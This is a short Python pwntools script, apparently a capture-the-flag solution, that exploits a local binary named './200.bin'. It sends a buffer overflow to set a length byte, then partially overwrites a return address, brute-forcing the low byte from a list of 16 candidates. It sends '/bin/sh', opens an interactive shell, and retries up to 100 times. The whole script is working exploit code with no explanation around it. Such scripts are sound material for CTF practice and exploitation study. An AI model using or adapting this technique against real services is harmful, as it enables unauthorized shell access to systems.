import random
from time import sleep
from pwn import *

shell_list = ['\x09', '\x19', '\x29', '\x39', '\x49', '\x59', '\x69', '\x79', '\x89', '\x99', '\xa9', '\xb9', '\xc9', '\xd9', '\xe9', '\xf9']

fail = 0

while True:
    if fail == 100:
        break

    p = process("./200.bin")
    p.recv()
    payload = 'a'*40 + '\xca' #0xca = 202   182 + rbp(8) + 2
    p.sendline(payload)
    p.recv()
    payload = 'a'*200 + '\x01' + shell_list[random.randint(0,15)]
    p.sendline(payload)
    sleep(0.1)

    try:
        p.sendline('/bin/sh\x00')
        p.interactive()
        break
    except:
        print 'Fail ' + str(fail) + ' times!'
        fail += 1
        p.close()
        continue
